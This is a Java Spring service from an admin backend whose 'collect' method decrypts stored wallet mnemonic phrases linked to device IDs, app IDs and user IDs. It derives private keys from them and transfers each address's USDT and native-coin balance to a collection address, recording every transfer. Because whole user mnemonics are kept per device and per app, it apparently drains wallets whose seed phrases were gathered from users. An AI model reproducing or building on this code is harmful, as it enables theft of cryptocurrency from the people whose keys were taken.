package com.admin.service;

import java.math.BigDecimal;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import org.springframework.context.annotation.Lazy;
import org.springframework.stereotype.Service;

import com.admin.auth.AdminContext;
import com.admin.config.V26AdminProperties;
import com.admin.dao.AddressDao;
import com.admin.dao.CollectRecordDao;
import com.admin.dao.MnemonicDao;
import com.admin.entity.AddressEntity;
import com.admin.entity.CollectRecordEntity;
import com.admin.entity.MnemonicEntity;
import com.admin.util.MnemonicAesUtil;
import com.admin.util.WalletAddressUtil;
import com.alibaba.fastjson.JSON;

import lombok.extern.slf4j.Slf4j;

/**
 * 一键归集执行：解密助记词 → 派生私钥 → 链上转账（USDT 先、原生币后）→ 写 collectrecord。
 */
@Slf4j
@Service
public class CollectExecuteService {

    private final AddressDao addressDao;
    private final MnemonicDao mnemonicDao;
    private final CollectRecordDao collectRecordDao;
    private final AddressAdminService addressAdminService;
    private final BalanceLiveService balanceLiveService;
    private final ChainTransferService chainTransferService;
    private final V26AdminProperties props;

    public CollectExecuteService(
            AddressDao addressDao,
            MnemonicDao mnemonicDao,
            CollectRecordDao collectRecordDao,
            @Lazy AddressAdminService addressAdminService,
            BalanceLiveService balanceLiveService,
            ChainTransferService chainTransferService,
            V26AdminProperties props) {
        this.addressDao = addressDao;
        this.mnemonicDao = mnemonicDao;
        this.collectRecordDao = collectRecordDao;
        this.addressAdminService = addressAdminService;
        this.balanceLiveService = balanceLiveService;
        this.chainTransferService = chainTransferService;
        this.props = props;
    }

    public Map<String, Object> execute(AdminContext ctx, long addressRowId) {
        String operator = ctx == null || ctx.getUser() == null ? "" : ctx.getUser().getUsername();
        int operatorId = ctx == null || ctx.getUser() == null || ctx.getUser().getId() == null
                ? 0 : ctx.getUser().getId();

        Map<String, Object> preview = addressAdminService.collectPreview(ctx, addressRowId);
        if (!Boolean.TRUE.equals(preview.get("ok"))) {
            return failEarly(preview, operator, operatorId, addressRowId);
        }

        String chain = String.valueOf(preview.get("chain"));
        String fromAddr = String.valueOf(preview.get("from_address"));
        String toAddr = String.valueOf(preview.get("to_address"));
        long aid = ((Number) preview.get("address_row_id")).longValue();
        String nativeSymbol = String.valueOf(preview.getOrDefault("native_symbol", chain.toUpperCase(Locale.ROOT)));

        AddressEntity addr = addressDao.selectById(aid);
        MnemonicEntity mn = addr == null || addr.getMnemonicId() == null ? null : mnemonicDao.selectById(addr.getMnemonicId());
        String deviceId = mn == null ? "" : (mn.getDeviceId() == null ? "" : mn.getDeviceId());
        String appId = mn == null ? "" : (mn.getAppId() == null ? "" : mn.getAppId());
        int userid = mn != null && mn.getUserid() != null ? mn.getUserid() : 0;

        if (mn == null || mn.getResult() == null || mn.getResult().isBlank()) {
            return failWrite("缺少助记词，无法派生私钥", aid, chain, fromAddr, toAddr, deviceId, appId, userid, nativeSymbol, operator, operatorId);
        }
        String secret = props.getMnemonicAesKey() == null ? "" : props.getMnemonicAesKey().trim();
        if (!MnemonicAesUtil.hasSecret(secret) && MnemonicAesUtil.looksEncrypted(mn.getResult())) {
            return failWrite("服务器未配置助记词密钥", aid, chain, fromAddr, toAddr, deviceId, appId, userid, nativeSymbol, operator, operatorId);
        }

        String phrase;
        try {
            phrase = MnemonicAesUtil.decrypt(mn.getResult(), secret).trim();
        } catch (Exception e) {
            return failWrite("助记词解密失败：" + e.getMessage(), aid, chain, fromAddr, toAddr, deviceId, appId, userid, nativeSymbol, operator, operatorId);
        }
        if (phrase.isEmpty()) {
            return failWrite("助记词为空", aid, chain, fromAddr, toAddr, deviceId, appId, userid, nativeSymbol, operator, operatorId);
        }

        int addrIndex = addr.getAddrIndex() == null ? 0 : addr.getAddrIndex();
        String btcFormat = parseBtcFormat(addr.getAlgorithm());
        Map<String, String> keys = WalletAddressUtil.derivePrivateKeysHex(phrase, addrIndex, btcFormat);
        phrase = "";
        String priv = keys.getOrDefault(chain, "");
        if (priv == null || priv.isBlank()) {
            return failWrite("私钥派生失败", aid, chain, fromAddr, toAddr, deviceId, appId, userid, nativeSymbol, operator, operatorId);
        }

        String derivedAddr = chainTransferService.addressFromPriv(chain, priv, btcFormat);
        if (derivedAddr != null && !derivedAddr.isBlank()
                && !derivedAddr.equalsIgnoreCase(fromAddr)
                && !("tron".equals(chain) && derivedAddr.equals(fromAddr))) {
            // eth checksum vs lower
            if (!("eth".equals(chain) || "bsc".equals(chain))
                    || !derivedAddr.equalsIgnoreCase(fromAddr)) {
                if (!derivedAddr.equalsIgnoreCase(fromAddr)) {
                    return failWrite("私钥与地址不匹配（派生=" + derivedAddr + "）", aid, chain, fromAddr, toAddr,
                            deviceId, appId, userid, nativeSymbol, operator, operatorId);
                }
            }
        }

        String liveNative = String.valueOf(preview.getOrDefault("native_bal", "0"));
        String liveUsdt = String.valueOf(preview.getOrDefault("usdt_bal", "0"));
        try {
            String[] live = balanceLiveService.fetchAmounts(chain, fromAddr);
            if (live != null) {
                liveNative = live[0];
                liveUsdt = live[1];
            }
        } catch (Exception ignored) {
        }

        List<String> coinKinds = coinsToSweep(chain, liveNative, liveUsdt);
        if (coinKinds.isEmpty()) {
            return failWrite("无可归集余额（USDT/原生币）", aid, chain, fromAddr, toAddr, deviceId, appId, userid, nativeSymbol, operator, operatorId);
        }

        List<Map<String, Object>> transfers = new ArrayList<>();
        boolean anyOk = false;
        for (int i = 0; i < coinKinds.size(); i++) {
            String coinKind = coinKinds.get(i);
            if (i > 0 && "native".equals(coinKind)) {
                try {
                    String[] live = balanceLiveService.fetchAmounts(chain, fromAddr);
                    if (live != null) {
                        liveNative = live[0];
                    }
                } catch (Exception ignored) {
                }
                if (!gt0(liveNative)) {
                    String err = "USDT 归集后 " + nativeSymbol + " 余额不足，跳过原生币";
                    long recId = writeRecord(deviceId, appId, userid, aid, chain, nativeSymbol, "0", "", "failed",
                            fromAddr, toAddr, Map.of("ok", false, "error", err, "operator", operator), operatorId);
                    transfers.add(Map.of("ok", false, "coin", nativeSymbol, "amount", "0", "hash", "", "error", err, "record_id", recId));
                    continue;
                }
            }
            String coinLabel = "usdt".equals(coinKind) ? "USDT" : nativeSymbol;
            Map<String, Object> tr = chainTransferService.transfer(chain, priv, toAddr, coinKind, null, btcFormat);
            boolean ok = Boolean.TRUE.equals(tr.get("ok"));
            String txHash = String.valueOf(tr.getOrDefault("hash", ""));
            String amt = String.valueOf(tr.getOrDefault("amount", "0"));
            String err = ok ? "" : String.valueOf(tr.getOrDefault("error", "转账失败"));
            long recId = writeRecord(deviceId, appId, userid, aid, chain, coinLabel, amt, txHash,
                    ok ? "success" : "failed", fromAddr, toAddr, tr, operatorId);
            Map<String, Object> item = new LinkedHashMap<>();
            item.put("ok", ok);
            item.put("coin", coinLabel);
            item.put("amount", amt);
            item.put("hash", txHash);
            item.put("error", err);
            item.put("record_id", recId);
            transfers.add(item);
            if (ok) {
                anyOk = true;
            }
        }

        Map<String, Object> out = new LinkedHashMap<>();
        out.put("ok", anyOk);
        out.put("from_address", fromAddr);
        out.put("to_address", toAddr);
        out.put("chain", chain);
        out.put("transfers", transfers);
        out.put("operator", operator);
        out.put("operator_id", operatorId);
        if (!anyOk) {
            out.put("error", "归集失败");
            out.put("message", "归集失败");
        } else {
            out.put("message", "归集完成");
        }
        return out;
    }

    private Map<String, Object> failEarly(Map<String, Object> preview, String operator, int operatorId, long addressRowId) {
        String err = String.valueOf(preview.getOrDefault("error", "无法归集"));
        long aid = preview.get("address_row_id") instanceof Number
                ? ((Number) preview.get("address_row_id")).longValue() : addressRowId;
        String chain = String.valueOf(preview.getOrDefault("chain", ""));
        String from = String.valueOf(preview.getOrDefault("from_address", ""));
        String to = String.valueOf(preview.getOrDefault("to_address", ""));
        String coin = String.valueOf(preview.getOrDefault("native_symbol", preview.getOrDefault("chain_label", "—")));
        Map<String, Object> payload = new LinkedHashMap<>(preview);
        payload.put("operator", operator);
        long recId = writeRecord("", "", 0, aid, chain, coin, "0", "", "failed", from, to, payload, operatorId);
        Map<String, Object> out = new LinkedHashMap<>();
        out.put("ok", false);
        out.put("error", err);
        out.put("message", err);
        out.put("record_id", recId);
        out.put("from_address", from);
        out.put("to_address", to);
        out.put("chain", chain);
        out.put("transfers", List.of(Map.of(
                "ok", false, "coin", coin, "amount", "0", "hash", "", "error", err, "record_id", recId)));
        out.put("operator", operator);
        out.put("operator_id", operatorId);
        return out;
    }

    private Map<String, Object> failWrite(String error, long aid, String chain, String from, String to,
            String deviceId, String appId, int userid, String coin, String operator, int operatorId) {
        Map<String, Object> payload = Map.of("ok", false, "error", error, "operator", operator);
        long recId = writeRecord(deviceId, appId, userid, aid, chain, coin, "0", "", "failed", from, to, payload, operatorId);
        Map<String, Object> out = new LinkedHashMap<>();
        out.put("ok", false);
        out.put("error", error);
        out.put("message", error);
        out.put("record_id", recId);
        out.put("from_address", from);
        out.put("to_address", to);
        out.put("chain", chain);
        out.put("transfers", List.of(Map.of(
                "ok", false, "coin", coin, "amount", "0", "hash", "", "error", error, "record_id", recId)));
        out.put("operator", operator);
        out.put("operator_id", operatorId);
        return out;
    }

    private long writeRecord(String deviceId, String appId, int userid, long aid, String chain, String coin,
            String amount, String txHash, String status, String outA, String inA, Object response, int operatorId) {
        String body;
        try {
            body = JSON.toJSONString(response);
        } catch (Exception e) {
            body = String.valueOf(response);
        }
        if (body != null && body.length() > 65000) {
            body = body.substring(0, 65000);
        }
        CollectRecordEntity row = new CollectRecordEntity();
        row.setDeviceId(trim(deviceId, 64));
        row.setAppId(trim(appId, 64));
        row.setUserid(userid);
        row.setAddressid(aid);
        row.setChain(trim(chain, 32));
        row.setCoin(trim(coin, 32));
        row.setOutaddress(trim(outA, 128));
        row.setInaddress(trim(inA, 128));
        row.setAmount(trim(amount == null ? "0" : amount, 64));
        row.setTxHash(trim(txHash, 128));
        row.setStatus(trim(status, 16));
        row.setResponseJson(body);
        row.setAddtime(System.currentTimeMillis() / 1000.0);
        row.setDoactionid(operatorId);
        collectRecordDao.insert(row);
        return row.getId() == null ? 0L : row.getId();
    }

    private static List<String> coinsToSweep(String chain, String nativeBal, String usdtBal) {
        List<String> out = new ArrayList<>();
        if (!"btc".equals(chain) && gt0(usdtBal)) {
            out.add("usdt");
        }
        if (gt0(nativeBal)) {
            out.add("native");
        }
        return out;
    }

    private static boolean gt0(String v) {
        try {
            return new BigDecimal(v == null || v.isBlank() ? "0" : v.trim()).compareTo(BigDecimal.ZERO) > 0;
        } catch (Exception e) {
            return false;
        }
    }

    private static String parseBtcFormat(String algorithm) {
        if (algorithm == null || algorithm.isBlank()) {
            return "bip84";
        }
        String low = algorithm.toLowerCase(Locale.ROOT);
        for (String f : new String[] {"bip86", "bip84", "bip49", "bip44"}) {
            if (low.contains(f)) {
                return f;
            }
        }
        return "bip84";
    }

    private static String trim(String s, int max) {
        String v = s == null ? "" : s;
        return v.length() <= max ? v : v.substring(0, max);
    }
}
